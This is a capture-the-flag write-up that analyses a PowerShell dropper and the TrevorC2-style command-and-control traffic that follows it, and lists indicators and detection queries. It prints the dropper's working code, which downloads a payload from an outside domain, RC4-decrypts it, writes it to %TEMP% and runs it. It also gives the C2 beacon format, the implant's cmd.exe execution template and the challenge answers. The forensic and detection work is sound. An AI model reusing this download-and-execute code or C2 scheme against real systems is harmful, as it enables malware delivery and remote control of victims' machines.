# Masquerade CTF Writeup: PowerShell Dropper, Payload Decryption, and C2 Traffic Analysis

## BLUF

During this investigation, the Windows event logs and packet capture revealed a PowerShell-based dropper that downloaded an obfuscated payload, decrypted it using RC4, wrote it to disk as `amdfendrsr.exe`, and executed it from the user’s `%TEMP%` directory.

Follow-on packet capture analysis showed the payload communicating with a command-and-control server over HTTP. The C2 traffic used misleading paths such as `/images?guid=`, legacy browser headers, a fake Google homepage as a decoy page, double Base64-encoded blobs, and AES-encrypted command output. Later analysis of embedded strings indicated behavior consistent with TrevorC2-style command execution and data exfiltration.

---

## Key Findings

| Finding              | Value                                  |
| -------------------- | -------------------------------------- |
| Initial script       | `updates.ps1`                          |
| Download URL         | `hxxp://api-edgecloud[.]xyz/amd[.]bin` |
| RC4 key              | `X9vT3pL2QwE8xR6ZkYhC4s`               |
| Dropped payload      | `%TEMP%\amdfendrsr.exe`                |
| Payload behavior     | C2 client / command runner             |
| C2 server            | `34[.]174[.]57[.]99`                   |
| C2 endpoint          | `/images?guid=`                        |
| Decoy page           | Fake Google homepage served by the C2  |
| C2 command execution | `cmd.exe /Q /c {0} 2>&1`               |
| Notable tool family  | TrevorC2-style traffic                 |

---

# 4. Methodology

## 4.1 Windows Event Log Analysis

First, I examined the Windows event logs.

<img width="958" height="281" alt="PowerShell event log overview" src="https://github.com/user-attachments/assets/7b2c0654-a978-4a8b-ae65-90cdd5ad6e49" />

The event timeline shows that PowerShell was launched and executed several commands within approximately 21 seconds. This strongly suggests automated script execution rather than normal interactive PowerShell use.

The first three informational events show that PowerShell started and provide context about the affected user and host:

```text
User: S-1-5-21-753961636-1548247123-2641200033-1001
Computer: DESKTOP-I6C5C7M
```

The first verbose event contains a simple script block:

```powershell
prompt
```

This is not suspicious by itself. The `prompt` function is commonly invoked by PowerShell to display or customize the interactive shell prompt. The `ScriptBlockID` is a unique identifier for that script block and does not contain meaningful evidence on its own.

The second verbose event is more interesting:

```powershell
.\updates.ps1
```

This command runs `updates.ps1` from the current working directory. I noted this filename for later correlation with the packet capture and any file system artifacts.

The third verbose event contains the contents of the script being executed.

<img width="1125" height="176" alt="PowerShell script block content" src="https://github.com/user-attachments/assets/7cfdc375-4365-4bd1-85ea-ec0daa720c79" />

The script is intentionally obfuscated. Its structure is designed to make quick analysis harder and to reduce the likelihood of simple signature-based detection.

---

## 4.2 PowerShell Script Deobfuscation

### Key Construction

The first important line defines the decryption key:

```powershell
$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
```

The strings are concatenated to hide the final value. Once combined, the key is:

<details>
<summary>Question 3 Spoiler</summary>

```text
X9vT3pL2QwE8xR6ZkYhC4s
```

</details>

This key is important because it is later used to decrypt the downloaded payload.

---

### Payload Download

The next line downloads content from a remote URL:

```powershell
$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''
```

This line uses string manipulation to hide the actual URL. The `-join` operator reconstructs the URL, and the `-replace '\s',''` operation removes whitespace from the downloaded content.

Decoded URL:

<details>
<summary>Question 1 Spoiler</summary>

```text
hxxp://api-edgecloud[.]xyz/amd[.]bin
```

</details>

The URL is defanged to prevent accidental browsing to a potentially malicious resource.

---

### Hex Decoding

The next portion converts the downloaded hex string into bytes:

```powershell
$b = for($x=0; $x -lt $h.Length; $x+=2) {
    [Convert]::ToByte($h.Substring($x, 2), 16)
}
```

Formatted for readability:

```powershell
$b = for ($x = 0; $x -lt $h.Length; $x += 2) {
    [Convert]::ToByte($h.Substring($x, 2), 16)
}
```

This loop processes the downloaded payload two characters at a time. Each pair of characters is interpreted as a hexadecimal byte and added to the byte array `$b`.

In plain English:

1. Start at the beginning of the downloaded string.
2. Take two characters.
3. Convert those two hex characters into one byte.
4. Repeat until the entire string is converted.

---

### RC4 Decryption Routine

The next section is the decryption logic:

```powershell
$s = 0..255 $j = 0 for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp } $i = $j = 0 $d = foreach ($byte in $b) { $i = ($i + 1) % 256 $j = ($j + $s[$i]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp $byte -bxor $s[($s[$i] + $s[$j]) % 256] }
```

Formatted:

```powershell
$s = 0..255
$j = 0

for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256
    $temp = $s[$i]
    $s[$i] = $s[$j]
    $s[$j] = $temp
}

$i = $j = 0

$d = foreach ($byte in $b) {
    $i = ($i + 1) % 256
    $j = ($j + $s[$i]) % 256
    $temp = $s[$i]
    $s[$i] = $s[$j]
    $s[$j] = $temp
    $byte -bxor $s[($s[$i] + $s[$j]) % 256]
}
```

This routine initializes a 256-byte state array, mixes it with the key, and then XORs each payload byte with a generated keystream.

This is consistent with the:

<details>
<summary>Question 2 Spoiler</summary>

```text
RC4 Key-Scheduling Algorithm (KSA)
```

</details>

This confirms that the payload downloaded from `amd.bin` is encrypted and must be RC4-decrypted using the extracted key.

---

### Payload Write and Execution

The final section writes the decrypted payload to disk and executes it:

```powershell
$p = $env:TEMP + '\amdfendrsr.exe'
[System.IO.File]::WriteAllBytes($p, $d)
Start-Process $p
```

This means the script:

1. Builds a path in the user’s temporary directory.
2. Writes the decrypted payload to that location.
3. Executes the payload.

The resulting executable is:

```text
%TEMP%\amdfendrsr.exe
```

At this point, the initial PowerShell script has acted as a downloader, decryptor, dropper, and launcher.

---

# 5. Packet Capture Analysis

## 5.1 Initial PCAP Triage

The packet capture contains 4,342 packets, which is too many to manually inspect one packet at a time. I used Wireshark filters to narrow the scope.

Useful places to start included:

* The same timeframe as the PowerShell activity.
* The filename `amdfendrsr.exe`.
* DNS requests.
* HTTP traffic to suspicious domains.
* Traffic involving the known download URL.

I began by filtering for DNS activity related to the malicious download domain.

<img width="1261" height="293" alt="DNS lookup for malicious URL" src="https://github.com/user-attachments/assets/bb345bdb-8e75-4d9e-a0f4-1d5507e28851" />

The DNS query resolves the malicious download domain to:

```text
34[.]174[.]85[.]91
```

Next, I filtered for traffic to and from that IP address. This revealed a single TCP connection. Following the TCP stream showed the downloaded encrypted payload.

<img width="860" height="818" alt="TCP stream containing encrypted payload" src="https://github.com/user-attachments/assets/d0a19d02-7ef8-4641-8322-970e520b8fdd" />

---

## 5.2 Payload Decryption in CyberChef

Based on the PowerShell script analysis, I knew the downloaded payload was:

1. Hex encoded.
2. RC4 encrypted.
3. Encrypted with the key `X9vT3pL2QwE8xR6ZkYhC4s`.

I recreated that process in CyberChef.

<img width="1913" height="826" alt="CyberChef RC4 payload decryption" src="https://github.com/user-attachments/assets/468e493e-0dfd-4057-b528-88fad95e1721" />

The output confirmed that the decrypted content is a Windows executable.

I then calculated the SHA-256 hash of the decrypted payload. This hash can be used for detection, correlation, and verification on other potentially affected systems.

<img width="1093" height="527" alt="SHA-256 hash of decrypted payload" src="https://github.com/user-attachments/assets/406a675d-3bc6-4c54-aa59-df1b1c9e3430" />

---

## 5.3 Strings Analysis

Since the decrypted payload is a compiled executable, I inspected its strings for useful indicators.

One string immediately stood out:

<img width="283" height="259" alt="TrevorC2 string" src="https://github.com/user-attachments/assets/a8fd034e-4837-4c04-9cc1-f9545cbbaa1d" />

This suggested a possible relationship to TrevorC2, so I noted it for follow-on research.

Additional strings were not displayed normally because they were separated by null bytes.

<img width="942" height="176" alt="Null-separated strings" src="https://github.com/user-attachments/assets/01f6bdcc-35b7-49f5-9a26-f6c2658c847a" />

<img width="944" height="76" alt="More null-separated strings" src="https://github.com/user-attachments/assets/586b66f9-82e0-4bd6-9bd7-58df0b48ef1d" />

After extracting the null-separated characters into readable text, several important configuration values became visible.

<img width="640" height="208" alt="Extracted C2 strings" src="https://github.com/user-attachments/assets/ee04a2af-1858-470d-b62b-c3f17e0b2923" />

The extracted strings revealed:

```text
http://34.174.57.99/images?guid=
GET
Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: identity
[*] Cannot connect to {0} seconds...
http://34.174.57.99/
<!-- {0} oldcss= --></body>
nothing
cmd.exe /Q /c {0} 2>&1
```

These strings are extremely important.

They indicate that the payload likely:

1. Communicates with a C2 server at `34[.]174[.]57[.]99`.
2. Sends data through `/images?guid=`.
3. Uses an old Internet Explorer-style User-Agent.
4. Retrieves or parses tasking from a fake HTML page.
5. Executes received commands using `cmd.exe`.
6. Redirects command error output into standard output using `2>&1`.

The command execution template is especially significant:

```cmd
cmd.exe /Q /c {0} 2>&1
```

Breakdown:

| Component | Meaning                                            |
| --------- | -------------------------------------------------- |
| `cmd.exe` | Launches the Windows command shell                 |
| `/Q`      | Quiet mode                                         |
| `/c {0}`  | Executes the command inserted into `{0}` and exits |
| `2>&1`    | Redirects stderr to stdout                         |

This strongly suggests the payload is a command-execution implant.

---

## 5.4 TrevorC2 Research

Before continuing, I performed quick OSINT on TrevorC2. TrevorC2 is a command-and-control framework associated with TrustedSec and Dave Kennedy. Its traffic can blend into normal web traffic and may hide tasking or output in web content.

The strings recovered from the payload are consistent with that style of operation:

* Fake web page content.
* HTTP GET-based communication.
* Encoded/encrypted payloads.
* Hidden command tasking.
* Command execution through `cmd.exe`.

The key recovered from strings was:

```text
M4squ3r4d3Th3P4ck3tSt34lthM0d31337
```

This value is 34 bytes long, which is not a valid raw AES key length. AES keys must be 16, 24, or 32 bytes.

A common way to convert a passphrase into a valid AES-256 key is to take the SHA-256 hash of the passphrase.

```text
SHA256("M4squ3r4d3Th3P4ck3tSt34lthM0d31337")
```

This produces a 32-byte value suitable for AES-256.

---

# 6. C2 Traffic Analysis

## 6.1 Initial Beacon

After the payload was downloaded and executed, I examined the next relevant TCP stream.

Wireshark filter:

```text
tcp.stream eq 43
```

<img width="820" height="280" alt="Initial C2 beacon" src="https://github.com/user-attachments/assets/ba9816cc-3dba-4433-8bd0-10cddfe7d844" />

The request was made to:

```http
GET /images?guid=<encoded_data> HTTP/1.1
Host: 34.174.57.99
User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: identity
Connection: Close
```

This appears to be an initial beacon to the C2 server.

The `guid` value is not a normal GUID. Instead, it is Base64-encoded data. This is consistent with a C2 client sending an encoded host identifier or initial check-in blob.

The server responded with:

```http
HTTP/1.1 200 OK
Server: IIS
Content-Length: 0
Set-Cookie: sessionid=MneddXbRtQMyUlh
```

The ETag value was:

```text
da39a3ee5e6b4b0d3255bfef95601890afd80709
```

This is the SHA-1 hash of an empty string, which matches the `Content-Length: 0` response. The server appears to be acknowledging the beacon while returning no tasking.

The `sessionid` cookie appears to be a randomly generated identifier used to track future traffic from the compromised host.

---

## 6.2 Decoy Google Page

Next, I examined the following TCP stream:

```text
tcp.stream eq 44
```

<img width="848" height="713" alt="Fake Google page from C2" src="https://github.com/user-attachments/assets/7dfe2540-617c-4a14-a649-73d09a319144" />

The client requested the C2 root page:

```http
GET / HTTP/1.1
Host: 34.174.57.99
Cookie: sessionid=MneddXbRtQMyUlh
```

The important detail is that the client reused the same `sessionid` cookie that was issued during the initial beacon.

<details>
<summary>Question 6 Spoiler</summary>

```text
34[.]174[.]57[.]99
```

</details>

The server responded with a Google-looking HTML page. However, this page was not served by Google. It was served by the C2 server at `34[.]174[.]57[.]99`.

The ETag for this response was:

```text
544dec025c05c611ec4032a4c077907ce423361c
```

This matches the SHA-1 hash of the returned HTML body.

This suggests that the C2 server is using a copied Google homepage as a decoy page. The decoy likely exists to make the server look benign during casual inspection.

This request repeated approximately every 15 seconds, suggesting beacon or polling behavior while the client waited for tasking.

---

## 6.3 Large `guid` Request

After several decoy page requests, the client made another request to `/images?guid=`. This time, the `guid` parameter was unusually large.

<img width="844" height="724" alt="Large C2 GUID request" src="https://github.com/user-attachments/assets/0acce5b1-d141-4757-8302-d20ad1d51597" />

The request followed the same pattern:

```http
GET /images?guid=<large_encoded_blob> HTTP/1.1
Host: 34.174.57.99
Cookie: sessionid=MneddXbRtQMyUlh
User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
```

The `guid` field is again not a normal GUID. It is a large encoded blob.

Based on the earlier TrevorC2 research and the payload strings, the data appears to be:

1. Base64 encoded.
2. Base64 encoded again.
3. AES encrypted.

The AES key was derived by taking the SHA-256 hash of the recovered passphrase:

```text
M4squ3r4d3Th3P4ck3tSt34lthM0d31337
```

For AES-CBC-style decryption, an IV is also required. In this case, the IV appears to be taken from the beginning of the encrypted payload. In CyberChef, this was handled by extracting the initial IV material and decrypting the remaining ciphertext.

<img width="1164" height="890" alt="CyberChef AES decrypt of C2 payload" src="https://github.com/user-attachments/assets/81ecf186-afda-4829-b696-a4e924acda0f" />

The decrypted data showed that the C2 client had extracted information from the desktop.

---

## 6.4 Decrypting All C2 `guid` Messages

Next, I filtered for all HTTP GET requests containing `guid=`.

<img width="1303" height="197" alt="Wireshark filter for guid traffic" src="https://github.com/user-attachments/assets/7fa45e43-4907-47bf-a9bc-74a5c6de0e80" />

After decrypting each `guid` payload, I found the following results:

| Request               | Decrypted Result                          |
| --------------------- | ----------------------------------------- |
| First `guid` request  | Defines `&magic_hostname=DESKTOP-I6C5C7M` |
| Second `guid` request | Desktop information / command output      |
| Third `guid` request  | Output of `ipconfig /all`                 |
| Final `guid` request  | Final CTF flag                            |

The final decrypted payload contained the flag required for the last question.

<img width="1169" height="657" alt="Final decrypted C2 message containing flag" src="https://github.com/user-attachments/assets/eef55fb0-395b-438f-8749-5549e954b497" />

---

# 7. Reconstructed Attack Flow

The full activity can be summarized as follows:

```text
1. PowerShell starts.
2. PowerShell runs .\updates.ps1.
3. updates.ps1 reconstructs the RC4 key.
4. updates.ps1 downloads amd.bin from api-edgecloud[.]xyz.
5. The downloaded payload is whitespace-stripped and hex-decoded.
6. The payload is RC4-decrypted.
7. The decrypted EXE is written to %TEMP%\amdfendrsr.exe.
8. The EXE is executed.
9. The EXE beacons to 34[.]174[.]57[.]99/images?guid=.
10. The server issues a session cookie.
11. The client requests / and receives a fake Google page.
12. The client continues polling the server.
13. The client sends AES-encrypted command output through /images?guid=.
14. The decrypted C2 traffic reveals host information, command output, and the final flag.
```

---

# 8. Indicators of Compromise

## Network Indicators

| Indicator                                                       | Type           | Notes                          |
| --------------------------------------------------------------- | -------------- | ------------------------------ |
| `api-edgecloud[.]xyz`                                           | Domain         | Initial payload download       |
| `hxxp://api-edgecloud[.]xyz/amd[.]bin`                          | URL            | RC4-encrypted payload          |
| `34[.]174[.]85[.]91`                                            | IP address     | Resolved payload download host |
| `34[.]174[.]57[.]99`                                            | IP address     | C2 server                      |
| `/images?guid=`                                                 | URI path/query | Encoded C2 communication       |
| `sessionid=MneddXbRtQMyUlh`                                     | HTTP cookie    | C2 session tracking            |
| `Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko` | User-Agent     | Hardcoded legacy browser UA    |

## Host Indicators

| Indicator                | Type             | Notes                             |
| ------------------------ | ---------------- | --------------------------------- |
| `updates.ps1`            | Script           | Initial PowerShell script         |
| `amdfendrsr.exe`         | Executable       | Dropped payload                   |
| `%TEMP%\amdfendrsr.exe`  | File path        | Payload execution location        |
| `cmd.exe /Q /c {0} 2>&1` | Command template | C2 command execution              |
| `DESKTOP-I6C5C7M`        | Hostname         | Compromised endpoint in challenge |

## Cryptographic / Encoding Artifacts

| Artifact            | Value                                      |
| ------------------- | ------------------------------------------ |
| RC4 key             | `X9vT3pL2QwE8xR6ZkYhC4s`                   |
| AES passphrase      | `M4squ3r4d3Th3P4ck3tSt34lthM0d31337`       |
| AES key derivation  | `SHA-256(passphrase)`                      |
| Encoding pattern    | Double Base64                              |
| Empty response ETag | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |
| Decoy page ETag     | `544dec025c05c611ec4032a4c077907ce423361c` |

---

# 9. Detection Opportunities

## PowerShell Script Block Logging

Look for PowerShell scripts that:

* Use `System.Net.WebClient`.
* Use `DownloadString`.
* Use string concatenation to build URLs.
* Use `WriteAllBytes`.
* Execute payloads from `%TEMP%`.
* Contain RC4-like logic with `0..255`, `-bxor`, and byte swapping.

Example detection logic:

```text
EventCode=4104
AND (
    "DownloadString"
    AND "WriteAllBytes"
    AND "Start-Process"
)
```

RC4-specific script block hunting:

```text
EventCode=4104
AND "-bxor"
AND "0..255"
AND "% 256"
```

---

## Network Detection

Look for HTTP requests with:

* Raw IP destination.
* `/images?guid=`.
* Very large query strings.
* Legacy IE User-Agent.
* `Accept-Encoding: identity`.
* Repeated polling to `/`.
* Fake Google HTML served from non-Google infrastructure.

Example logic:

```text
dest_ip=34.174.57.99
AND uri_path="/images"
AND uri_query="guid=*"
```

Large `guid` payload detection:

```text
uri_path="/images"
AND uri_query="guid=*"
AND len(uri_query) > 500
```

---

## Process Execution

Look for suspicious child processes spawned by the dropped executable:

```text
ParentImage="*\amdfendrsr.exe"
AND Image="*\cmd.exe"
AND CommandLine="*/Q /c*"
AND CommandLine="*2>&1*"
```

---

# 10. Conclusion

This investigation began with a suspicious PowerShell event and led to the discovery of a multi-stage malware execution chain.

The PowerShell script downloaded an encrypted payload, decrypted it with RC4, wrote it to disk, and executed it. The resulting executable communicated with a C2 server using HTTP requests disguised as image requests and fake Google homepage traffic.

The C2 channel used double Base64 encoding and AES encryption to protect command output and host data. Once decrypted, the traffic revealed host identification, command output, and the final CTF flag.

The most important takeaway is that the malicious activity was visible across multiple evidence sources:

* PowerShell script block logs showed the initial dropper.
* DNS and HTTP traffic showed the payload download.
* CyberChef confirmed the decrypted executable.
* Strings analysis revealed C2 configuration and command execution behavior.
* PCAP analysis revealed encrypted TrevorC2-style communication.

By correlating host logs, network traffic, decoded strings, and decrypted payloads, the full attack chain became clear.
